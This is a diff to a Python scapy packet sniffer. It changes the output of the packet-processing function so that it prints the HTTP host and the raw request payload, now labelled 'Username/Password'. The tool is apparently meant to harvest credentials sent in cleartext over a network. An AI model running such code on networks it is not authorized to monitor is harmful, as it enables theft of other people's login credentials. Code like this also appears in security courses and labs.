@@ -21,8 +21,11 @@ def sniff(interface):
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)
-            print(packet[scapy.Raw].Referer)
+            print("-------------------------------------------------------")
+            print("--- Website --- "), print(packet[http.HTTPRequest].Host)
+            print("-------------------------------------------------------")
+            print("--- Username/Password --- "), print(packet[scapy.Raw].load)
+            print("-------------------------------------------------------")
 
 
 options = get_arguments()
